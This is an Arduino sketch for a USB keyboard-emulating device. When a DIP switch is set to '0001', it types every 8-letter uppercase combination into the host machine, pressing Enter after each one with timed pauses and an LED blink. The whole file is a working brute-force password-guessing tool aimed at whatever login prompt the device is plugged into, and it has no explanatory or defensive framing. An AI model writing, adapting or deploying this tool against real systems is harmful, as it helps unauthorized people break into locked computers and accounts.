#include "Keyboard.h"

//int start = 33;
int start = 65;
//int end = 126;
int end = 90;

void typeKey(int key){
  Keyboard.press(key);
  //delay(10);
  Keyboard.release(key);
}

void bruteFOR(int start, int end){
  for(int q=start; q<=end; q++){
    for(int w=start; w<=end; w++){
      for(int e=start; e<=end; e++){
        for(int r=start; r<=end; r++){
          for(int t=start; t<=end; t++){
            for(int y=start; y<=end; y++){
              for(int u=start; u<=end; u++){
                for(int i=start; i<=end; i++){
                  typeKey(q);
                  typeKey(w);
                  typeKey(e);
                  typeKey(r);
                  typeKey(t);
                  typeKey(y);
                  typeKey(u);
                  typeKey(i);
                  typeKey(KEY_RETURN);
                  digitalWrite(13, HIGH);
                  delay(1000);
                  typeKey(KEY_RETURN);
                  delay(1000);
                  digitalWrite(13, LOW);
                }
              }
            }
          }
        }
      }
    }
  }
}

void setup(){
  String dip = "";
  pinMode(6, INPUT_PULLUP);
  pinMode(7, INPUT_PULLUP);
  pinMode(8, INPUT_PULLUP);
  pinMode(9, INPUT_PULLUP);
  pinMode(13, OUTPUT);
  if(digitalRead(6) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(7) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(8) == LOW){dip += "1";}else{dip += "0";}
  if(digitalRead(9) == LOW){dip += "1";}else{dip += "0";}
  Keyboard.begin();
  delay(750);
  if(dip == "0001"){
    bruteFOR(start, end);
  }
  Keyboard.end();
}

void loop(){
}

